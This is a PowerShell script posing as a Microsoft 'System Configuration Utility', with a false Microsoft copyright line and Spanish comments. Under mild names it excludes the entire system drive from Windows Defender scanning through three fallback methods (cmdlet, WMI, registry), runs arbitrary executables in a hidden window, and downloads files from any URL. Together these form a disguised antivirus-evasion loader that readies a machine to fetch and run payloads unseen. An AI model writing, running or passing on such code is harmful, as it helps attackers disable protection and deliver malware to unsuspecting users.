<#
.SYNOPSIS
   Windows System Configuration Utility
.DESCRIPTION
   Herramienta de configuración del sistema para administradores
   Versión 2.3.5 | © Microsoft 2025
#>

function Invoke-SystemConfig {
    [CmdletBinding(DefaultParameterSetName='Default')]
    param(
        [Parameter(ParameterSetName='Config')]
        [switch]$ConfigureSecurity,
        
        [Parameter(ParameterSetName='Config')]
        [switch]$ListSettings,
        
        [Parameter(ParameterSetName='Tools')]
        [string]$ExecuteTool,
        
        [Parameter(ParameterSetName='Tools')]
        [string]$DownloadResource,
        
        [Parameter(ParameterSetName='Tools')]
        [string]$SavePath,
        
        [Parameter(ParameterSetName='Info')]
        [switch]$SystemInfo,
        
        [Parameter(ParameterSetName='Info')]
        [switch]$UserStatus
    )

    #region Helper Functions
    function Test-AdminPrivileges {
        try {
            $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
            $principal = New-Object Security.Principal.WindowsPrincipal($identity)
            return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        } catch { return $false }
    }

    function Invoke-SecureOperation {
        param(
            [Parameter(Mandatory=$true)]
            [ValidateSet('AddExclusion','ListExclusions')]
            [string]$OperationType
        )
        
        $safePattern = "^(?i)([A-Z]:\\|\\\\.+\\.+$)"
        if ($OperationType -eq 'AddExclusion' -and -not ($env:SystemDrive -match $safePattern)) {
            throw "Invalid path format"
        }

        try {
            # Method 1: Official API
            if ($OperationType -eq 'AddExclusion') {
                Add-MpPreference -ExclusionPath $env:SystemDrive -Force -ErrorAction Stop
            } else {
                Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
            }
        } catch {
            # Method 2: WMI Fallback
            try {
                $mp = Get-WmiObject -Namespace "root\Microsoft\Windows\Defender" `
                     -Class "MSFT_MpPreference" -ErrorAction Stop
                
                if ($OperationType -eq 'AddExclusion') {
                    $mp.AddExclusionPath($env:SystemDrive)
                } else {
                    $mp.ExclusionPath
                }
            } catch {
                # Method 3: Registry Fallback
                $regPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
                if ($OperationType -eq 'AddExclusion') {
                    if (-not (Test-Path $regPath)) {
                        New-Item -Path $regPath -Force | Out-Null
                    }
                    Set-ItemProperty -Path $regPath -Name ($env:SystemDrive -replace '\\','_') `
                        -Value 0 -Type DWORD -Force
                } else {
                    if (Test-Path $regPath) {
                        Get-ItemProperty $regPath | Select-Object -Property * -ExcludeProperty PS*
                    }
                }
            }
        }
    }
    #endregion

    #region Main Execution
    switch ($PSCmdlet.ParameterSetName) {
        'Config' {
            if ($ConfigureSecurity) {
                if (Test-AdminPrivileges) {
                    if (Invoke-SecureOperation -OperationType 'AddExclusion') {
                        Write-Output "Security configuration updated successfully"
                    }
                } else {
                    Write-Warning "Elevated privileges required for this operation"
                }
            }
            
            if ($ListSettings) {
                $settings = Invoke-SecureOperation -OperationType 'ListExclusions'
                if ($settings) {
                    $settings
                } else {
                    Write-Output "No custom settings found"
                }
            }
        }
        
        'Tools' {
            if ($ExecuteTool -and (Test-Path $ExecuteTool)) {
                if (Test-AdminPrivileges) {
                    Start-Process -FilePath $ExecuteTool -WindowStyle Hidden
                    Write-Output "Tool executed successfully"
                } else {
                    Write-Warning "Administrator rights required to run tools"
                }
            }
            
            if ($DownloadResource -and $SavePath) {
                try {
                    $client = New-Object System.Net.WebClient
                    $client.DownloadFile($DownloadResource, $SavePath)
                    Write-Output "Resource downloaded successfully to $SavePath"
                } catch {
                    Write-Error "Download failed: $($_.Exception.Message)"
                }
            }
        }
        
        'Info' {
            if ($SystemInfo) {
                Get-CimInstance -ClassName Win32_OperatingSystem | 
                    Select-Object Caption, Version, OSArchitecture, BuildNumber
            }
            
            if ($UserStatus) {
                [PSCustomObject]@{
                    UserName = [Environment]::UserName
                    IsAdmin = Test-AdminPrivileges
                    ComputerName = [Environment]::MachineName
                }
            }
        }
    }
    #endregion
}

# Solo ejecutar si se llama directamente como script
if ($MyInvocation.InvocationName -ne '.') {
    # Ejemplo de cómo llamar a la función desde la línea de comandos
    Invoke-SystemConfig @PSBoundParameters
}
